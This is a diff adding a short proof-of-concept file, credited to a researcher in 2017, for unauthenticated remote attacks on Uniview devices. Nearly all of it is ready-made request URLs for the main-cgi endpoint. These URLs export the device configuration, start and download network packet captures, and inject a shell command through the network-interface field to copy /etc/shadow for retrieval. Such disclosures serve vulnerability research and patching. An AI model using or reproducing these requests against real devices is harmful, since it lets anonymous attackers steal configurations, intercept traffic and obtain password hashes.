@@ -1,0 +1,34 @@
+[STX]
+
+Subject: Uniview RCE and export config PoC
+Researcher: bashis <mcw noemail eu> (October 2017)
+
+Attack Vector: Remote
+Authentication: Anonymous (no credentials needed)
+
+[Export config]
+/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}
+
+-[tcpdump]-
+
+[check active capture]
+/cgi-bin/main-cgi?json={"cmd":263,"szUserName":"","u32UserLoginHandle":-1}
+
+[start capture]
+/cgi-bin/main-cgi?json={"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":"eth0"}
+
+[stop capture]
+/cgi-bin/main-cgi?json={"cmd":264,"status":0,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":"eth0"}
+
+[download capture]
+/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":-1}
+
+-[Remote Command Execution]-
+
+[Get /etc/shadow]
+/cgi-bin/main-cgi?json={"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":";cp%20/etc/shadow%20/tmp/packetcapture.pcap;"}
+
+[get the result]
+/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":-1}
+
+[ETX]
